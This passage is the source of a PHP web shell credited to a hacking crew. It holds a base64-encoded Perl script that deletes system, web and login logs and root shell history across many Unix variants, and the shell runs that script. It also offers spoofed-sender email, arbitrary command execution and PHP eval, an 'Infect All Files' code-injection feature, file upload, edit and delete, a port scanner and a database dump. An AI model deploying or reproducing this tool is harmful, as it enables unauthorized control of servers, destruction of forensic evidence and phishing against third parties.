ICAgICAgICAgICBpZigkb3MgZXEgImFpeCIpeyAjSWYgYWl4IHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgICAgIHByaW50ICJbK11BaXggU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgJG0gPSB1bmxpbmsgQGFpeDsKICAgICAgICAgICAgICBpZigkbSkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgICBlbHNlIHsgcHJpbnQgIlstXUVycm9yIjsgfQogICAgICAgICAgICAgIH0KICAgICAgICAgICAgIAogICAgICAgICAgICAgIGlmKCRvcyBlcSAiaXJpeCIpeyAjSWYgaXJpeCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldAogICAgICAgICAgICAgIHByaW50ICJbK11Jcml4IFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgICRuID0gdW5saW5rIEBpcml4OyAgIAogICAgICAgICAgICAgIGlmKCRuKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNNaXNjIExvZyBMb2NhdGlvbnMgICAKICAgICAgeyAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIEBtaXNjID0gKCIvZXRjL2h0dHBkL2xvZ3MvYWNjZXNzLmxvZyIsICIvZXRjL2h0dHBkL2xvZ3MvZXJyb3IubG9nIiwiL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL2V0Yy9odHRwZC9sb2dzL2Vycm9yX2xvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3IubG9nIiwiL3Zhci9sb2cvYXBhY2hlL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL3Zhci9sb2cvYXBhY2hlL2Vycm9yX2xvZyIsIi92YXIvbG9nL2FwYWNoZS9hY2Nlc3MubG9nIiwiL3Zhci9sb2cvYXBhY2hlL2Vycm9yLmxvZyIsIi92YXIvbG9nL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL3Zhci9sb2cvZXJyb3JfbG9nIiwiL3Zhci93d3cvbG9ncy9lcnJvci5sb2ciLCIvdmFyL3d3dy9sb2dzL2FjY2Vzcy5sb2ciLCIvdmFyL3d3dy9sb2dzL2Vycm9yX2xvZyIsCiAgICAgICAgICAgICIvdmFyL3d3dy9sb2dzL2FjY2Vzc19sb2ciKQogICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBPcGVuQlNEIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBvcGVuYnNkID0gKCIvdmFyL3d3dy9sb2cvYWNjZXNzX2xvZyIsICIvdmFyL3d3dy9sb2cvZXJyb3JfbG9nIikKICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBGcmVlQlNEIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBmcmVlYnNkID0gKCIvdXNyL2xvY2FsL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2ciLCAiL3Vzci9sb2NhbC9ldGMvaHR0cGQvbG9ncy9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIERlYmlhbiBTeXN0ZW1zCiAgIAogICAgICB7CiAgICAgICBAZGViaWFuID0gKCIvdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZyIsICIvdmFyL2xvZy9hcGFjaGUvZXJyb3IubG9nIiwKICAgICAgICIvdmFyL2xvZy9hcGFjaGUtc3NsL2Vycm9yLmxvZyIsICIvdmFyL2xvZy9hcGFjaGUtc3NsL2FjY2Vzcy5sb2ciKQogICAgICAgICAgIH0gICAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIFN1U0UgTGludXggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQHN1c2UgPSAoIi92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2ciLCAiL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nIikKICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBTb2xhcmlzIFN5c3RlbXMKICAgCiAgICAgIHsgICAKICAgICAgIEBzb2xhcmlzID0gKCIvdmFyL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2ciLCAiL3Zhci9hcGFjaGUvbG9ncy9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIExhbXBwIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBsYW1wcCA9ICgiL29wdC9sYW1wcC9sb2dzL2Vycm9yX2xvZyIsICIvb3B0L2xhbXBwL2xvZ3MvYWNjZXNzX2xvZyIpCiAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgUmVkIEhhdCwgTWFjIE9TIFggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQHJlZGhhdCA9ICgiL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZyIsICIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIElyaXggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQGlyaXggPSAoIi92YXIvYWRtL1NZU0xPRyIsICIvdmFyL2FkbS9zdWxvZyIsICIvdmFyL2FkbS91dG1wIiwgIi92YXIvYWRtL3V0bXB4IiwKICAgICAgICAgICAgICAiL3Zhci9hZG0vd3RtcCIsICIvdmFyL2FkbS93dG1weCIsICIvdmFyL2FkbS9sYXN0bG9nLyIsCiAgICAgICAgICAgICIvdXNyL3Nwb29sL2xwL2xvZyIsICIvdmFyL2FkbS9scC9scC1lcnJzIiwgIi91c3IvbGliL2Nyb24vbG9nIiwKICAgICAgICAgICAgIi92YXIvYWRtL2xvZ2lubG9nIiwgIi92YXIvYWRtL3BhY2N0IiwgIi92YXIvYWRtL2R0bXAiLAogICAgICAgICAgICAiL3Zhci9hZG0vYWNjdC9zdW0vbG9naW5sb2ciLCAidmFyL2FkbS9YMG1zZ3MiLCAiL3Zhci9hZG0vY3Jhc2gvdm1jb3JlIiwKICAgICAgICAgICAgIi92YXIvYWRtL2NyYXNoL3VuaXgiKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZyBzb2YgQWl4IFN5c3RlbXMKICAgICAgeyAgIAogICAgICBAYWl4ID0gKCIvdmFyL2FkbS9wYWNjdCIsICIvdmFyL2FkbS93dG1wIiwgIi92YXIvYWRtL2R0bXAiLCAiL3Zhci9hZG0vcWFjY3QiLCAgIAogICAgICAgICAgICAgICAiL3Zhci9hZG0vc3Vsb2ciLCAiL3Zhci9hZG0vcmFzL2VycmxvZyIsICIvdmFyL2FkbS9yYXMvYm9vdGxvZyIsCiAgICAgICAgICAgICAgICIvdmFyL2FkbS9jcm9uL2xvZyIsICIvZXRjL3V0bXAiLCAiL2V0Yy9zZWN1cml0eS9sYXN0bG9nIiwKICAgICAgICAgICAgICAgIi9ldGMvc2VjdXJpdHkvZmFpbGVkbG9naW4iLCAidXNyL3Nwb29sL21xdWV1ZS9zeXNsb2ciKSAgIAogICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIFN1bk9TIFN5c3RlbXMgICAKICAgICAgeyAgICAgICAgICAgICAgICAgICAgIAogICAgICBAc3Vub3MgPSAoIi92YXIvYWRtL21lc3NhZ2VzIiwgIi92YXIvYWRtL2FjdWxvZ3MiLCAiL3Zhci9hZG0vYWN1bG9nIiwKICAgICAgICAgICAgICAgICAiL3Zhci9hZG0vc3Vsb2ciLCAiL3Zhci9hZG0vdm9sZC5sb2ciLCAiL3Zhci9hZG0vd3RtcCIsCiAgICAgICAgICAgICAgICAgIi92YXIvYWRtL3d0bXB4IiwgIi92YXIvYWRtL3V0bXAiLCAiL3Zhci9hZG0vdXRtcHgiLAogICAgICAgICAgICAgICAgICIvdmFyL2FkbS9sb2cvYXNwcHAubG9nIiwgIi92YXIvbG9nL3N5c2xvZyIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL1BPUGxvZyIsICIvdmFyL2xvZy9hdXRobG9nIiwgIi92YXIvYWRtL3BhY2N0IiwKICAgICAgICAgICAgICAgICAiL3Zhci9scC9sb2dzL2xwc2NoZWQiLCAiL3Zhci9scC9sb2dzL3JlcXVlc3RzIiwKICAgICAgICAgICAgICAiL3Zhci9jcm9uL2xvZ3MiLCAiL3Zhci9zYWYvX2xvZyIsICIvdmFyL3NhZi9wb3J0L2xvZyIpCiAgICAgICAgIH0gICAgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBMaW51eCBTeXN0ZW1zICAgICAgIAogICAgICB7ICAgICAKICAgICAgIEBsaW51eCA9ICgiL3Zhci9sb2cvbGFzdGxvZyIsICIvdmFyL2xvZy90ZWxuZXRkIiwgIi92YXIvcnVuL3V0bXAiLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9zZWN1cmUiLCIvcm9vdC8ua3NoX2hpc3RvcnkiLCAiL3Jvb3QvLmJhc2hfaGlzdG9yeSIsCiAgICAgICAgICAgICAgICAgIi9yb290Ly5iYXNoX2xvZ3V0IiwgIi92YXIvbG9nL3d0bXAiLCAiL2V0Yy93dG1wIiwKICAgICAgICAgICAgICAgICAiL3Zhci9ydW4vdXRtcCIsICIvZXRjL3V0bXAiLCAiL3Zhci9sb2ciLCAiL3Zhci9hZG0iLAogICAgICAgICAgICAgICAgICIvdmFyL2FwYWNoZS9sb2ciLCAiL3Zhci9hcGFjaGUvbG9ncyIsICIvdXNyL2xvY2FsL2FwYWNoZS9sb2dzIiwKICAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9hcGFjaGUvbG9ncyIsICIvdmFyL2xvZy9hY2N0IiwgIi92YXIvbG9nL3hmZXJsb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9tZXNzYWdlcy8iLCAiL3Zhci9sb2cvcHJvZnRwZC94ZmVybG9nLmxlZ2FjeSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3Byb2Z0cGQueGZlcmxvZyIsICIvdmFyL2xvZy9wcm9mdHBkLmFjY2Vzc19sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2ciLCAiL3Zhci9sb2cvaHR0cHNkL3NzbF9sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9odHRwc2Qvc3NsLmFjY2Vzc19sb2ciLCAiL2V0Yy9tYWlsL2FjY2VzcyIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3FtYWlsIiwgIi92YXIvbG9nL3NtdHBkIiwgIi92YXIvbG9nL3NhbWJhIiwKICAgICAgICAgICAgICAgICAiL3Zhci9sb2cvc2FtYmEubG9nLiVtIiwgIi92YXIvbG9jay9zYW1iYSIsICIvcm9vdC8uWGF1dGhvcml0eSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3BvcGxvZyIsICIvdmFyL2xvZy9uZXdzLmFsbCIsICIvdmFyL2xvZy9zcG9vbGVyIiwKICAgICAgICAgICAgICAgICAiL3Zhci9sb2cvbmV3cyIsICIvdmFyL2xvZy9uZXdzL25ld3MiLCAiL3Zhci9sb2cvbmV3cy9uZXdzLmFsbCIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL25ld3MvbmV3cy5jcml0IiwgIi92YXIvbG9nL25ld3MvbmV3cy5lcnIiLCAiL3Zhci9sb2cvbmV3cy9uZXdzLm5vdGljZSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL25ld3Mvc3Vjay5lcnIiLCAiL3Zhci9sb2cvbmV3cy9zdWNrLm5vdGljZSIsCiAgICAgICAgICAgICAgICAgIi92YXIvc3Bvb2wvdG1wIiwgIi92YXIvc3Bvb2wvZXJyb3JzIiwgIi92YXIvc3Bvb2wvbG9ncyIsICIvdmFyL3Nwb29sL2xvY2tzIiwKICAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC93d3cvbG9ncy90aHR0cGRfbG9nIiwgIi92YXIvbG9nL3RodHRwZF9sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9uY2Z0cGQvbWlzY2xvZy50eHQiLCAiL3Zhci9sb2cvbmN0ZnBkLmVycnMiLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9hdXRoIikKICAgICAgICAgfQogICAgICAgICAKICAgICAgCiAKICAg");
$openp = fopen("logseraser.pl", "w+")or die("Error");
fwrite($openp, $erase)or die("Error");
fclose($openp);
$aidx = passthru("perl logseraser.pl ".$_POST['functionp']);
unlink("logseraser.pl");
echo "</textarea>";
}
elseif(isset($_POST['mail'])) 
{
echo "<form method='post' action=''>
<td valign=top><center><font face='Verdana' size='2'>Send Fake Mail (HTML Allowed)</font></center>
<center><font face='Verdana' size='1'>To:<br>
<input type='text' size='19' name='mto'><br>
From:<br>
<input type='text' size='19' name='mfrom'><br>
Object:<br>
<input type='text' size='19' name='mobj'><br>
Message:<br>
<textarea name='mtext' cols=20 rows=4></textarea><br>
<br><input type='submit' value='Send' name='senm'>
</form></table><br>";}
if(isset($_POST['senm'])) 
{
//Mail With HTML   <- webcheatsheet.com
$to = $_POST['mto'];
$subject = $_POST['mobj'];
$contentz = $_POST['mtext']."<!--";
$random_hash = md5(date('r', time()));
$headers = "From: ".$_POST['mfrom']."rnReply-To: ".$_POST['mfrom'];
$headers .= "rnContent-Type: multipart/alternative; boundary='PHP-alt-".$random_hash."'";
ob_start(); 
?>

--PHP-alt-<?php echo $random_hash; ?> 
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

<?  echo "$contentz"; ?>
--PHP-alt-<?php echo $random_hash; ?>--
<?
$message = ob_get_clean();

$mail = @mail( $to, $subject, $message, $headers );

if($mail) { echo "<br><td valign=top>
<center><font color='green' size='1'>Mail Sent</font></center></table>"; }
else { echo "<br><td valign=top>
<center><font color='red' size='1'>Error</font></center></table>"; }
}

elseif(isset($_POST['encoder'])) { 
//Encoder
echo "<form method='post' action=''><td valign=top>
<center><font face='Verdana' size='1'>Text:</font><br><textarea name='encod'></textarea><br><input type='submit' value='Encode' name='encode'></form></table>"; 
}
if(isset($_POST['encode'])) { echo "<td valign=top>
<center><font face='Verdana' size='1'>
MD5:   &nbsp;&nbsp;&nbsp;&nbsp;<input type='text' size='35' value='".md5($_POST['encod'])."'><br>
Sha1:  &nbsp;&nbsp;&nbsp;<input type='text' size='35' value='".sha1($_POST['encod'])."'><br>
Crc32: &nbsp;&nbsp;&nbsp;<input type='text' size='34' value='".crc32($_POST['encod'])."'><br><br>
Base64 Encode: <input type='text' size='35' value='".base64_encode($_POST['encod'])."'><br>
Base64 Decode: <input type='text' size='36' value='".base64_decode($_POST['encod'])."'></table>";}

//File List
echo "</table>";
   if(isset($_POST['cmdex']))
   {
   switch ($_POST['functionz']) {
    case "system":
    system(stripslashes($_POST['cmd']));
    break;
    case "popen":
    $handle = popen($_POST['cmd'].' 2>&1', 'r');
    echo "'$handle'; " . gettype($handle) . "n";
    $read = fread($handle, 2096);
    echo $read;
    pclose($handle);
    break;
    case "shell_exec":
    shell_exec(stripslashes($_POST['cmd']));
    break;
    case "exec":
    exec(stripslashes($_POST['cmd']));
    break;
    case "passthru":
    passthru(stripslashes($_POST['cmd']));
    }}

if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)
{
$file = $_POST['editfile'];
$content = file_get_contents($file);
echo "<br><table class='menu' width=100%><tr><td><center><form action='' method='post'><center>
<font size=2 face='Verdana'><b>:: Edit File ::</b></font><br><input type='hidden' name='editfile' value='".$file."'><font size=1 face='Verdana'>".stripslashes($file)."</font><br>
<textarea rows=20 cols=80 name='newtext'>".htmlspecialchars($content)."</textarea><br /><input type='submit' name='edit' value='Edit'></form></td></table>";
}
if(isset($_POST['edit'])) {
$file = $_POST['editfile'];
$fh = fopen($file, "w+")or die("<font color=red face=Verdana size=1>Error: cannot open file</font>");
fwrite($fh, stripslashes($_POST['newtext']))or die("<font color=red face=Verdana size=1>Error: cannot write to file</font>");
fclose($fh);
echo "<font size=1 face=Verdana>Done.</font></td></tr>";
}
echo "<table width=100%><tr><td>
<center><font size='1' face='Verdana'>:: Total Files: $fileq [$filew files and $pahtw directory] ::</font></center></td></tr></table>
<center><table class=menuz width=100% cellspacing=0 cellpadding=0 border=0>
<font size='1'>
<td valign=top><font face='Verdana' size='2'><b>File Name:</b></font></td><td valign=top><font face='Verdana' size='2'><b>Type:</b></font></td><td valign=top width=15%><font face='Verdana' size=2><b>Size:</b></font></td><td valign=top width=10%><font face='Verdana' size='2'><b>Perms:</b></font></td>$listf</font>
</table></center>"; 

echo "
<br>
<table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'><tr><td valign=top>
<center><b><font size='2' face='Verdana'>:: Eval PHP code ::<br></font></b>
   <form method='post' action=''>
   <textarea name=php_eval cols=50 rows=4></textarea><br>
   <input type='submit' value='Execute!'>
   </form>
</td><td valign=top><center><font face='Verdana' size='2'><b>:: Infect All Files ::</b></font><form method='post' action=''><textarea name='cod3inf' cols=50 rows=4><?php /* your php code here */ ?></textarea><br><input type='submit' value='Infect All Files!' name='inf3ct'><br>";
if(isset($textzz)) { echo $textzz; }
echo "</center></form></td></tr>
<tr>
<td valign=top>
<center><b><font size='2' face='Verdana'>:: Go Dir ::<br></font></b>
<form name='directory' method='post' action=''>
<input type='text' name='dir' value='$dir'>
<input type='submit' value='Go'>
</form></td><td><center><b><font size='2' face='Verdana'>:: Edit File ::<br></font></b>
<form method='post' action=''>
<input type='text' name='editfile' value='$dir'>
<input type='submit' value='Go' name='doedit'>
</form></center></td></tr><tr><td valign=top>
<center><b><font size=2 face='Verdana'>:: Cmd Execution ::</font></b><br>
        <form method='post' action=''>
		<input name=cmd size=20 type=text> 
        <select name=functionz>
          <option>passthru</option>
          <option>popen</option>
          <option>exec</option>
          <option>shell_exec</option>
          <option>system</option>
        </select> <input type='submit' name='cmdex' value='Enter'></form></td>
		<td>
<center><b><font size='2' face='Verdana'>:: Port Scanner ::<br></font></b>
   <form name='scanner' method='post'>
   <input type='text' name='host' value='127.0.0.1' >
   <select name='protocol'>
   <option value='tcp'>tcp</option>
   <option value='udp'>udp</option>
   </select>
   <input type='submit' value='Scan Ports'>
";
if(isset($host) && isset($proto))
{
echo "<br /><font size='1' face='Verdana'>Open Ports: ";

for($current = 0; $current <= 23; $current++)
{
$currents = $myports[$current];
$service = getservbyport($currents, $proto);
// Try to connect to port
$result = fsockopen($host, $currents, $errno, $errstr, 1);
// Show results
if($result)
{
echo "$currents, ";
}
}
}
echo "</font></form></td></tr>
<tr>
<td valign=top width=50%>
<center><b><font size='2' face='Verdana'>:: Upload Files ::<br></font></b>
   <form method='post' action='' enctype='multipart/form-data'>
   <input type='hidden' name='dare' value='$dir'>
   <input type='file' name='ffile'>
   <input type='submit' name='ok' value='Upload File'>
   </center>   
   </form>
</td>
<td valign=top>
<center><b><font size='2' face='Verdana'>:: Delete Files ::<br></font></b>
   <form method='post' action=''>
   <input type='text' name='delete' value='$dir' > <input type='submit' value='Delete file' name='deletfilez'>
   </center>
   </form>
</td></tr>
<tr>
<td valign=top>
 
<center><b><font size='2' face='Verdana'>:: Make Directory ::<br></font></b>
   <form method='post' action=''>
   <input type='text' name='makedir' value='$dir'> <input type='submit' value='Make'>
   </center>
   </form>
</td>
<td valign=top>
<center><b><font size='2' face='Verdana'>:: Delete Directory ::<br></font></b>
   <form method='post' action=''>
   <input type='text' name='deletedir' value='$dir'> <input type='submit' value='Delete'>
   </center>
   </form>
</td></tr>
<tr>
<td valign=top width=50%>
<center><b><font size='2' face='Verdana'>:: Make File ::<br></font></b>
   <form method='post' action=''>
   <input type='hidden' name='darezz' value='$dir'>
   <font size='1' face='Verdana'>Title:</font><br>
   <input type='text' name='names' size='30'><br>
   <font size='1' face='Verdana'>Source:</font><br>
   <textarea rows='16' cols='30' name='source'></textarea><br>
   <input type='submit' value='Upload'>
   </center>
   </form>
</td>
<td valign=top width=50%>
<center><b><font size='2' face='Verdana'>:: Database ::<br></font></b>
   <form method='post' action=''>
   <font size='1' face='Verdana'>Username: - Password:</font><br>
   <input type='text' name='user' size='10'>
   <input type='text' name='passd' size='10'><br>
   <font size='1' face='Verdana'>Host:</font><br>
   <input type='text' name='host' value='localhost'><br>
   <font size='1' face='Verdana'>DB Name:</font><br>
   <input type='text' name='db'><br>
   <font size='1' face='Verdana'>Query:</font><br>
   <textarea rows='10' cols='30' name='query'></textarea><br>
   <input type='submit' value='Send Query' name='godb'><br><input type='submit' name='dump' value='Dump Database'>
   </center>
   </form>
</td> </tr>

</table>
</table>
<br />
<table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td valign=top>
<center><b><font size='1' face='Verdana'>
:: Powered by Cod3rZ - DevilsNight Crew - <a href='http://cod3rz.helloweb.eu'>http://cod3rz.helloweb.eu</a> - <a href='http://devilsnight.altervista.org'>http://devilsnight.altervista.org</a> - Vers10n ".$version." ::
</center></font></td></tr>
</body>
</html>";

?> 